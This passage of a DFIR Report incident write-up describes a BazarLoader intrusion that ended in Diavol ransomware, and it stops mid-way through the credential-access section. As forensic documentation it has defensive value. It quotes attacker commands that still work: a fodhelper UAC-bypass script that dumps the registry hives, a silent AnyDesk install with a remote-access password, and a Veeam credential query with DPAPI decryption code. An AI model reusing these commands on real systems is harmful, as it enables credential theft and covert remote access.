<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21313"><a href="https://thedfirreport.com/subscribe/">Subscribe</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21316"><a href="https://thedfirreport.com/contact/">Contact Us</a></li>
</ul> </nav>
</div>
</div>
</div>
<div class="clock">
<div id="time"></div>
<div id="date">Thursday, October 24, 2024</div>
</div>
</div>
<nav class="secondary-navigation" role="navigation" aria-label="Secondary Navigation">
<div class="wrap">
<button class="secondary-menu-toggle" aria-controls="primary-menu" aria-expanded="false">
<span class="secondary-toggle-text">Menu</span>
<span class="secondary-toggle-bar"></span>
</button>
<ul id="primary-menu" class="secondary-menu"><li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21323"><a href="https://thedfirreport.com/services/threat-intelligence/">Threat Intelligence</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21322"><a href="https://thedfirreport.com/services/detection-rules/">Detection Rules</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-31037"><a href="https://thedfirreport.com/services/dfir-labs/">DFIR Labs</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-35457"><a href="https://thedfirreport.com/services/dfir-labs/ctf/">Capture The Flag (CTF)</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-32608"><a href="https://thedfirreport.com/services/dfir-labs/dfir-labs-leaderboard/">Leaderboard</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-38110"><a href="https://thedfirreport.com/services/dfir-labs/ctf-winners/">CTF Winners</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-has-children menu-item-21321"><a href="https://thedfirreport.com/services/mentoring-coaching-program/">Mentoring &#038; Coaching Program</a>
<ul class="sub-menu">
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21327"><a href="https://thedfirreport.com/services/mentoring-coaching-program/book-a-session/">Book A Session</a></li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21328"><a href="https://thedfirreport.com/services/mentoring-coaching-program/meet-the-team/">Meet The Team</a></li>
</ul>
</li>
<li class="menu-item menu-item-type-post_type menu-item-object-page menu-item-21324"><a href="https://thedfirreport.com/services/case-artifacts/">Case Artifacts</a></li>
</ul> </div>
</nav>
</div>
</div>
</header>
<div id="content" class="site-content">
<div class="site-content-cell">
<div class="wrap wrap-width">
<div id="primary" class="content-area">
<main id="main" class="site-main">
<article id="post-4874" class="post-4874 post type-post status-publish format-standard hentry category-adfind category-bazar category-cobaltstrike category-diavol category-ransomware entry">
<div class="entry-content-holder">
<header class="entry-header">
<div class="entry-meta">
<span class="cat-links">
<a class="category-color-24" href="https://thedfirreport.com/category/adfind/">adfind</a>
<a class="category-color-27" href="https://thedfirreport.com/category/bazar/">bazar</a>
<a class="category-color-6" href="https://thedfirreport.com/category/cobaltstrike/">cobaltstrike</a>
<a class="category-color-90" href="https://thedfirreport.com/category/diavol/">diavol</a>
<a class="category-color-2" href="https://thedfirreport.com/category/ransomware/">ransomware</a>
</span>
</div>
<h1 class="entry-title">Diavol Ransomware</h1>
<div class="entry-meta">
<span class="posted-on"><a href="https://thedfirreport.com/2021/12/13/diavol-ransomware/" rel="bookmark"><time class="entry-date published" datetime="2021-12-13T02:13:31+00:00">December 13, 2021</time></a></span> </div>
</header>
<div class="entry-content">
<div class="markdown">
<p>In the past, threat actors have used BazarLoader to deploy Ryuk and Conti ransomware, as reported on many <a href="https://thedfirreport.com/category/bazar/" target="_blank" rel="nofollow noopener">occasions</a>. In this intrusion, however, a BazarLoader infection resulted in deployment of Diavol Ransomware.</p>
<p>First discovered in June 2021, by <a href="https://www.fortinet.com/blog/threat-research/diavol-new-ransomware-used-by-wizard-spider" target="_blank" rel="nofollow noopener">FortiGuard Labs</a>, Diavol Ransomware has been suspected to be linked to the <a href="https://attack.mitre.org/groups/G0102/" target="_blank" rel="noopener">Wizard Spider</a> threat actor. In this report, we observed threat actors deploy multiple Cobalt Strike DLL beacons, perform internal discovery using Windows utilities, execute lateral movement using AnyDesk and RDP, dump credentials multiple ways, exfiltrate data and deploy domain wide ransomware in as little as 32 hours from initial access.</p>
<h3 id="case-summary">Case Summary</h3>
<p>The malware (BazarLoader) was delivered to an endpoint via email, which included a link to OneDrive. The OneDrive link, directed the user to download a file that was a zip, which included an ISO inside. Once opened (mounted) on the users system, it was determined the ISO contained a LNK file and a DLL. The LNK file masqueraded as a Document enticing the user to click/open it. Once the user executed the LNK file, the BazarLoader infection was initiated.</p>
<p>As seen in previous cases, the BazarLoader infection began with internal reconnaissance of the environment using Windows utilities such as net, nltest, and ipconfig. After being inactive for one hour, the intrusion continued with dropping of multiple Cobalt Strike beacon DLL&#8217;s on the beachhead. This was followed by another round of discovery from the compromised machine. The threat actor then proceeded with execution of adf.bat, which is a script that queries various Active Directory objects using the AdFind tool. The first run was using a renamed binary named qq.exe and then the threat actor later dropped a properly named AdFind binary and executed the same discovery commands again. Soon after that, with the use of another simple batch script named fodhelper_reg_hashes.bat, they performed credentials acquisition via dumping of SAM, SECURITY and SYSTEM registry hives.</p>
<p>Returning after a gap of almost 18 hours, the threat actor performed another round of network scanning from the beachhead. This was then followed by attempts to Kerberoast and &#8220;AS-REProast&#8221; using the tool Rubeus.<span style="color: #000000;"> The threat actor then moved</span> laterally via RDP to a server that contained file shares. After gaining access to the system they installed a remote access application, AnyDesk, as well as Filezilla.</p>
<p>The threat actors used FileZilla to exfiltrate data out of the environment. They then pivoted towards critical systems, such as domain controllers and a server that held backups. The threat actor then dumped LSASS from one of the domain controllers, using task manager, and then uploaded the dump file to <a href="https://ufile.io/" target="_blank" rel="noopener">ufile.io</a> using Internet Explorer.</p>
<p>On the backup server, the threat actors attempted to dump databases associated with the backup solution. In one attempt, they used a documented technique to recover the encoded password and decode it using the Microsoft Data Protection API (DPAPI).</p>
<p>After around 42 hours post initial intrusion, the threat actors pushed towards completion of their final objective. RDP access was established from the central file server that the threat actors had compromised to all endpoints and a batch script named &#8220;kill.bat&#8221; was executed on all of the targeted machines.</p>
<p>The script consists of commands that removes Volume Shadow copies, disables Windows automatic startup repair, and stops all the running services on the host. Once the script completed execution, the Diavol Ransomware was deployed via the RDP connection on each machine by running the executable manually. From initial access, to ransomware deployment, the threat actors took about 42 hours to deploy ransomware domain wide, but from the login on the third day, to the last host ransom execution, only about an hour passed for the actors to finish their deployment.</p>
<h3 id="services">Services</h3>
<p>We offer multiple services including a <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">Threat Feed service</a> which tracks Command and Control frameworks such as Cobalt Strike, BazarLoader, Covenant, Metasploit, Empire, PoshC2, etc. More information on this service and others can be found <a href="https://thedfirreport.com/services/" target="_blank" rel="nofollow noopener">here</a>.</p>
<p>We also have artifacts and IOCs available from this case such as pcaps, memory captures, files, event logs including Sysmon, Kape packages, and more, under our <a href="https://www.patreon.com/thedfirreport" target="_blank" rel="nofollow noopener">Security Researcher and Organization</a> services.</p>
<h3 id="timeline">Timeline</h3>
<p><img fetchpriority="high" decoding="async" class="alignnone size-full wp-image-4982" src="https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware.png" alt width="1128" height="2501" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware.png 1128w, https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware-135x300.png 135w, https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware-462x1024.png 462w, https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware-768x1703.png 768w, https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware-693x1536.png 693w, https://thedfirreport.com/wp-content/uploads/2021/12/Diavol-Ransomware-924x2048.png 924w" sizes="(max-width: 1128px) 100vw, 1128px" /></p>
<p>Analysis and reporting completed by <a href="https://twitter.com/yatinwad" target="_blank" rel="noreferrer noopener">@yatinwad</a> and AnonymousContributor1</p>
<p>Reviewed by <a href="https://twitter.com/tas_kmanager" target="_blank" rel="noreferrer noopener">@tas_kmanager</a> and <a href="https://twitter.com/samaritan_o" target="_blank" rel="noreferrer noopener">@samaritan_o</a></p>
<h3 id="mitre-attck">MITRE ATT&amp;CK</h3>
<h3 id="initial-access">Initial Access</h3>
<p>Initial access was via a OneDrive link that arrived via malicious emails that was reported via <a class="css-4rbku5 css-18t94o4 css-1dbjc4n r-1loqt21 r-1wbh5a2 r-dnmrzs r-1ny4l3l" role="link" href="https://twitter.com/ankit_anubhav"><span class="css-901oao css-16my406 r-poiln3 r-bcqeeo r-qvutc0">@ankit_anubhav</span></a>.</p>
<blockquote class="twitter-tweet" data-width="550" data-dnt="true">
<p lang="en" dir="ltr">Stubborn <a href="https://twitter.com/hashtag/Bazarloader?src=hash&amp;ref_src=twsrc%5Etfw">#Bazarloader</a> hosted malware again on onedrive ( link still live ) with zip -&gt; iso -&gt; (lnk +DLL )</p>
<p>/onedrive.live.com/download?cid=0094E8452D7CDD65&amp;resid=94E8452D7CDD65%21135&amp;authkey=AEN3yDYOia1YdKM</p>
<p>Connects to /159.223.31.75/body/athlete<a href="https://t.co/Hkg0UCBK85">https://t.co/Hkg0UCBK85</a> <a href="https://t.co/VY4wRl8w5D">pic.twitter.com/VY4wRl8w5D</a></p>
<p>&mdash; Ankit Anubhav (@ankit_anubhav) <a href="https://twitter.com/ankit_anubhav/status/1452957382087098373?ref_src=twsrc%5Etfw">October 26, 2021</a></p></blockquote>
<p><script async src="https://platform.twitter.com/widgets.js" charset="utf-8" type="a9cd24205746bd4ad0a209ac-text/javascript"></script></p>
<p>Upon accessing the link, a zip file was downloaded.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-2.png"><img decoding="async" class="alignnone size-full wp-image-4896" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-2.png" alt width="632" height="199" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-2.png 632w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-2-300x94.png 300w" sizes="(max-width: 632px) 100vw, 632px" /></a></p>
<p>The original URL of the file can be traced from the file stream log data (Sysmon Event ID 15) as well.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-4.png"><img decoding="async" class="alignnone size-full wp-image-4898" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-4.png" alt width="1990" height="196" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-4.png 1990w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-4-300x30.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-4-1024x101.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-4-768x76.png 768w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-4-1536x151.png 1536w" sizes="(max-width: 1990px) 100vw, 1990px" /></a></p>
<p>Reviewing the file stream data from Sysmon we can see that the zip contains an ISO file.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-3.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4897" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-3.png" alt width="798" height="196" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-3.png 798w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-3-300x74.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-3-768x189.png 768w" sizes="(max-width: 798px) 100vw, 798px" /></a></p>
</div>
<div class="markdown">
<p><a href="https://twitter.com/ffforward" target="_blank" rel="nofollow noopener">TheAnalyst</a> reported similar BazarLoader activity via malicious emails around the same time frame.</p>
<blockquote class="twitter-tweet" data-width="550" data-dnt="true">
<p lang="en" dir="ltr">Large <a href="https://twitter.com/hashtag/BazarISO?src=hash&amp;ref_src=twsrc%5Etfw">#BazarISO</a>&gt;<a href="https://twitter.com/hashtag/BazarLoader?src=hash&amp;ref_src=twsrc%5Etfw">#BazarLoader</a>&gt;<a href="https://twitter.com/hashtag/BazarBackdoor?src=hash&amp;ref_src=twsrc%5Etfw">#BazarBackdoor</a> inc from /muppetcast.com, started yesterday. Direct links to <a href="https://twitter.com/onedrive?ref_src=twsrc%5Etfw">@onedrive</a>. Iso contains dll+lnk running dll with entrypoint &quot;EnterDll&quot;, your EDR might have problems detecting this, and less obvious for most users than maldocs&#8230; &gt; <a href="https://t.co/ZS8sspWqtG">pic.twitter.com/ZS8sspWqtG</a></p>
<p>&mdash; TheAnalyst (@ffforward) <a href="https://twitter.com/ffforward/status/1448232486325080064?ref_src=twsrc%5Etfw">October 13, 2021</a></p></blockquote>
<p><script async src="https://platform.twitter.com/widgets.js" charset="utf-8" type="a9cd24205746bd4ad0a209ac-text/javascript"></script></p>
<h3 id="execution">Execution</h3>
<p>The BazarLoader ISO downloaded from the OneDrive link, consists of a malicious DLL and shortcut file named &#8220;Documents.lnk&#8221; which executes the DLL via rundll32.exe.</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/58e8364a54cbb2bf322755fccff03ad0c3ed48ba70ff988bbd1b75de2ee75e29" alt="LNK File" /></p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/a5310880256ac70d3345b130b587933a71b5a70361f904681d32ddd9666436ad" alt="enter image description here" /></p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/a550b6961e68854d024ceeec1d4b36fa28ef373b6891202a1923deb538356a36" alt="enter image description here" /></p>
<p>After the initial execution, the malware contacted two of its C2 IPs:</p>
<pre><code><span class="hljs-number">159.223</span><span class="hljs-number">.31</span><span class="hljs-number">.75</span>
<span class="hljs-number">206.189</span><span class="hljs-number">.49</span><span class="hljs-number">.239</span></code></pre>
<p>We then observed threat actors dropping multiple Cobalt Strike Beacon DLL&#8217;s on the host in the following file paths:</p>
<pre><code><span class="hljs-tag">C</span>:\<span class="hljs-tag">Users</span>\&lt;<span class="hljs-tag">user</span>&gt;\<span class="hljs-tag">AppData</span>\<span class="hljs-tag">Local</span>\<span class="hljs-tag">Temp</span>\<span class="hljs-tag">tfpkuengdlu</span><span class="hljs-class">.dll</span>
<span class="hljs-tag">C</span>:\<span class="hljs-tag">ProgramData</span>\<span class="hljs-tag">temp</span><span class="hljs-class">.dll</span>
<span class="hljs-tag">C</span>:\<span class="hljs-tag">Users</span>\&lt;&gt;\<span class="hljs-tag">AppData</span>\<span class="hljs-tag">Local</span>\<span class="hljs-tag">Temp</span>\<span class="hljs-tag">uvvfvnnswte</span><span class="hljs-class">.dll</span></code></pre>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/f328a0053ea4b48e92a0c05c9a69e84bc7dc27b2681f3d56ba6b226045ced85e" alt="enter image description here" /></p>
<p><img loading="lazy" decoding="async" class="alignnone wp-image-4967 size-full" src="https://thedfirreport.com/wp-content/uploads/2021/12/Beacons.png" alt width="2086" height="1099" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/Beacons.png 2086w, https://thedfirreport.com/wp-content/uploads/2021/12/Beacons-300x158.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/Beacons-1024x539.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/Beacons-768x405.png 768w, https://thedfirreport.com/wp-content/uploads/2021/12/Beacons-1536x809.png 1536w, https://thedfirreport.com/wp-content/uploads/2021/12/Beacons-2048x1079.png 2048w" sizes="(max-width: 2086px) 100vw, 2086px" /></p>
<h3 id="persistence">Persistence</h3>
<p>A new BITS job, named &#8220;Microsoft Office Manager upgrade v24.24&#8221; was created on the beachhead host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-1.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4915" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-1.png" alt width="700" height="759" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-1.png 700w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-1-277x300.png 277w" sizes="(max-width: 700px) 100vw, 700px" /></a></p>
<p>The BITS job failed because the requested URL does not exist.</p>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/87b4608057969d60d33b2b35d55b9d0c37970fe6f4b721f7423e381d1704c760" alt="enter image description here" /></p>
<p>While reporting failure in the logs, the BITS job did re-execute the mounted ISO files every 3 hours, for the length of the intrusion on the beachhead host.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-10.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4917" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-10.png" alt width="648" height="417" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-10.png 648w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-10-300x193.png 300w" sizes="(max-width: 648px) 100vw, 648px" /></a></p>
<p>After the threat actor moved laterally, we observed them installing Anydesk on multiple clients to create additional means of keeping access.</p>
<p>They used PowerShell and cmd to automate the download and installation of AnyDesk. In order to install Anydesk for unattended access you have to set a password. The password here was set to <code>J9kzQ2Y0qO</code></p>
<pre><code>(<span class="hljs-keyword">new</span>-<span class="hljs-keyword">object</span> System.Net.WebClient).DownloadFile(<span class="hljs-string">"http://download.anydesk.com/AnyDesk.exe"</span>, <span class="hljs-string">"C:\ProgramData\AnyDesk.exe"</span>)
cmd.exe /c C:\ProgramData\AnyDesk.exe --install C:\ProgramData\AnyDesk --start-with-win --silent
cmd.exe /c echo J9kzQ2Y0qO | C:\ProgramData\anydesk.exe --<span class="hljs-keyword">set</span>-password
cmd.exe /c C:\ProgramData\AnyDesk.exe --<span class="hljs-keyword">get</span>-id
</code></pre>
<p>The threat actor not only leaked their password when installing AnyDesk, but they also temporarily copied the password to the machine as the name of a text file.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4950" src="https://thedfirreport.com/wp-content/uploads/2021/12/3123.png" alt width="270" height="183" /></p>
<p>This password also matches one from the leaked <a href="https://michaelkoczwara.medium.com/conti-ransomware-group-cobalt-strike-c2-analysis-rdp-persistence-cc535d35eaba">Conti manuals</a> back in August.</p>
<p><img loading="lazy" decoding="async" class="alignnone size-medium wp-image-4992" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-17-300x252.png" alt width="300" height="252" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-17-300x252.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-17.png 694w" sizes="(max-width: 300px) 100vw, 300px" /></p>
<p>From the Anydesk logs, we can also see the Client-ID and the IP used to access the clients. Logs can be found at %programdata%\AnyDesk\ad_svc.trace</p>
<pre><code>IP: <span class="hljs-number">23.106</span><span class="hljs-number">.215</span><span class="hljs-number">.31</span>, Client-id: <span class="hljs-number">903491377</span></code></pre>
<p><img decoding="async" title="enter image title here" src="https://thedfirreport.com/wp-content/uploads/2021/12/004e8b4c8dcc96face490df33986e1036c40baf9688a1e9af9212c3a6bd37ff1" alt="ad-svc.trace" /></p>
<h3><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4948" src="https://thedfirreport.com/wp-content/uploads/2021/12/11.png" alt width="693" height="479" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/11.png 693w, https://thedfirreport.com/wp-content/uploads/2021/12/11-300x207.png 300w" sizes="(max-width: 693px) 100vw, 693px" /></h3>
<h3 id="defense-evasion">Defense Evasion</h3>
<p>The threat actors made use of process injection through-out the intrusion. The BazaLoader malware injected into an Edge browser process, as observed by the discovery activity, and Cobalt Strike DLL&#8217;s activity.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-5.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4909" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-5.png" alt width="653" height="427" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-5.png 653w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-5-300x196.png 300w" sizes="(max-width: 653px) 100vw, 653px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-6.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4910" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-6.png" alt width="677" height="420" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-6.png 677w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-6-300x186.png 300w" sizes="(max-width: 677px) 100vw, 677px" /></a></p>
<p>Cobalt Strike processes were also observed injecting into various other processes.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-7.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4911" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-7.png" alt width="1635" height="225" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-7.png 1635w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-7-300x41.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-7-1024x141.png 1024w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-7-768x106.png 768w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-7-1536x211.png 1536w" sizes="(max-width: 1635px) 100vw, 1635px" /></a></p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-9.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4913" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-9.png" alt width="441" height="245" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-9.png 441w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-9-300x167.png 300w" sizes="(max-width: 441px) 100vw, 441px" /></a></p>
<h3 id="credential-access">Credential Access</h3>
<p>Threat actors performed dumping of SAM, SECURITY and SYSTEM registry hives using a batch script named &#8220;fodhelper_reg_hashes.bat&#8221;.</p>
<p>Contents of fodhelper_reg_hashes.bat are as follows:</p>
<pre><code>reg.exe add hkcu\software\classes\ms-settings\shell\<span class="hljs-keyword">open</span>\command /ve /d <span class="hljs-string">"reg.exe save hklm\sam c:\ProgramData\sam.save"</span> /f
reg.exe add hkcu\software\classes\ms-settings\shell\<span class="hljs-keyword">open</span>\command /v <span class="hljs-string">"DelegateExecute"</span> /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\<span class="hljs-keyword">open</span>\command /ve /d <span class="hljs-string">"reg.exe save hklm\security c:\ProgramData\security.save"</span> /f
reg.exe add hkcu\software\classes\ms-settings\shell\<span class="hljs-keyword">open</span>\command /v <span class="hljs-string">"DelegateExecute"</span> /f
fodhelper.exe

reg.exe add hkcu\software\classes\ms-settings\shell\<span class="hljs-keyword">open</span>\command /ve /d <span class="hljs-string">"reg.exe save hklm\system c:\ProgramData\system.save"</span> /f
reg.exe add hkcu\software\classes\ms-settings\shell\<span class="hljs-keyword">open</span>\command /v <span class="hljs-string">"DelegateExecute"</span> /f
fodhelper.exe

reg.exe <span class="hljs-keyword">delete</span> hkcu\software\classes\ms-settings /f &gt;nul <span class="hljs-number">2</span>&gt;&amp;<span class="hljs-number">1</span></code></pre>
<p>They also performed enumeration of the web browser information using <a href="https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/more">more</a>.</p>
<p><a href="https://thedfirreport.com/wp-content/uploads/2021/12/8099-11.png"><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4921" src="https://thedfirreport.com/wp-content/uploads/2021/12/8099-11.png" alt width="820" height="419" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/8099-11.png 820w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-11-300x153.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/8099-11-768x392.png 768w" sizes="(max-width: 820px) 100vw, 820px" /></a></p>
<p>The following files were accessed:</p>
<pre><code>Users\<span class="hljs-tag">&lt;&gt;</span>\AppData\Local\Microsoft\Edge\User Data\Default\Login Data
Users\<span class="hljs-tag">&lt;&gt;</span>\AppData\Local\Microsoft\Edge\User Data\Default\Cookies
C:\Users\<span class="hljs-tag">&lt;&gt;</span>\AppData\Local\Temp\edge-cookies.json
</code></pre>
<p>Using a well known technique documented on the <a href="https://forums.veeam.com/veeam-backup-replication-f2/recover-esxi-password-in-veeam-t34630.html" target="_blank" rel="noopener">Veeam backup forum,</a> the threat actor managed to decrypt passwords used by Veeam. The encryption method used by Veeam is <a href="https://docs.microsoft.com/en-us/dotnet/standard/security/how-to-use-data-protection" target="_blank" rel="nofollow noopener">Data Protection API/DPAPI</a>.</p>
<p>All the activity was done using RDP on the server with backups.</p>
<ol>
<li>Dump the credentials using sqlcmd.exe to base64 passwords.</li>
</ol>
<pre><code>"<span class="hljs-tag">C</span>:\<span class="hljs-tag">Program</span> <span class="hljs-tag">Files</span>\<span class="hljs-tag">Microsoft</span> <span class="hljs-tag">SQL</span> <span class="hljs-tag">Server</span>\<span class="hljs-tag">Client</span> <span class="hljs-tag">SDK</span>\<span class="hljs-tag">ODBC</span>\130\<span class="hljs-tag">Tools</span>\<span class="hljs-tag">Binn</span>\<span class="hljs-tag">sqlcmd</span><span class="hljs-class">.exe</span>"  <span class="hljs-tag">-S</span> <span class="hljs-tag">localhost</span>,51341 <span class="hljs-tag">-E</span> <span class="hljs-tag">-y0</span> <span class="hljs-tag">-Q</span> "<span class="hljs-tag">SELECT</span> <span class="hljs-tag">TOP</span> (1000) <span class="hljs-attr_selector">[id]</span>,<span class="hljs-attr_selector">[user_name]</span>,<span class="hljs-attr_selector">[password]</span>,<span class="hljs-attr_selector">[usn]</span>,<span class="hljs-attr_selector">[description]</span>,<span class="hljs-attr_selector">[visible]</span>,<span class="hljs-attr_selector">[change_time_utc]</span><span class="hljs-tag">FROM</span> <span class="hljs-attr_selector">[VeeamBackup]</span>.<span class="hljs-attr_selector">[dbo]</span>.<span class="hljs-attr_selector">[Credentials]</span>;"
</code></pre>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4951" src="https://thedfirreport.com/wp-content/uploads/2021/12/3211.png" alt width="964" height="253" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/3211.png 964w, https://thedfirreport.com/wp-content/uploads/2021/12/3211-300x79.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/3211-768x202.png 768w" sizes="(max-width: 964px) 100vw, 964px" /></p>
<ol start="2">
<li>Via RDP and notepad, they created a new file containing the code for the decryption routine.</li>
</ol>
<pre><code>"<span class="hljs-tag">C</span>:\<span class="hljs-tag">Windows</span>\<span class="hljs-tag">system32</span>\<span class="hljs-tag">NOTEPAD</span><span class="hljs-class">.EXE</span>" <span class="hljs-tag">C</span>:\<span class="hljs-tag">Windows</span>\<span class="hljs-tag">Microsoft</span><span class="hljs-class">.NET</span>\<span class="hljs-tag">Framework</span>\&lt;version#&gt;\<span class="hljs-tag">veeam1</span><span class="hljs-class">.cs</span><span class="hljs-class">.txt</span></code></pre>
<p>Content of <strong>veeam1.cs.txt</strong></p>
<pre><code><span class="hljs-keyword">using</span> System;
<span class="hljs-keyword">using</span> System.Collections.Generic;
<span class="hljs-keyword">using</span> System.Security.Cryptography;
<span class="hljs-keyword">using</span> System.Text;

<span class="hljs-keyword">namespace</span> <span class="hljs-title">Main</span>
{
<span class="hljs-keyword">internal</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">class</span> <span class="hljs-title">Program</span>
   {
   <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Decrypt</span>(<span class="hljs-params"><span class="hljs-keyword">string</span> b,<span class="hljs-keyword">string</span> a</span>)</span>{
      <span class="hljs-keyword">if</span> (<span class="hljs-keyword">string</span>.IsNullOrEmpty(a))
      {
         <span class="hljs-keyword">return</span>;
      }
      <span class="hljs-keyword">byte</span>[] encryptedData = Convert.FromBase64String(a);
      Console.WriteLine(b+<span class="hljs-string">':'</span>+Encoding.UTF8.GetString(ProtectedData.Unprotect(encryptedData, <span class="hljs-keyword">null</span>, DataProtectionScope.LocalMachine)));
      <span class="hljs-keyword">return</span>;
   }
   <span class="hljs-function"><span class="hljs-keyword">private</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title">Main</span>(<span class="hljs-params"><span class="hljs-keyword">string</span>[] args</span>)
      </span>{
         Decrypt(<span class="hljs-string">"VATA"</span>,<span class="hljs-string">"&lt;BASE64 ENCODED PASSWORD HASH&gt;"</span>);
      }
 }
}
</code></pre>
<p><img loading="lazy" decoding="async" class="alignnone size-full wp-image-4952" src="https://thedfirreport.com/wp-content/uploads/2021/12/123.png" alt width="807" height="483" srcset="https://thedfirreport.com/wp-content/uploads/2021/12/123.png 807w, https://thedfirreport.com/wp-content/uploads/2021/12/123-300x180.png 300w, https://thedfirreport.com/wp-content/uploads/2021/12/123-768x460.png 768w" sizes="(max-width: 807px) 100vw, 807px" /></p>
<ol start="3">
<li>Execute, which gave the threat actors passwords that were used by Veeam.</li>
</ol>
<pre><code><span class="hljs-tag">c</span>:\<span class="hljs-tag">Windows</span>\<span class="hljs-tag">Microsoft</span><span class="hljs-class">.NET</span>\<span class="hljs-tag">Framework</span>\<span class="hljs-tag">v4</span><span class="hljs-class">.0</span><span class="hljs-class">.30319</span>\<span class="hljs-tag">csc</span><span class="hljs-class">.exe</span>  <span class="hljs-tag">veeam1</span><span class="hljs-class">.cs</span><span class="hljs-class">.txt</span></code></pre>
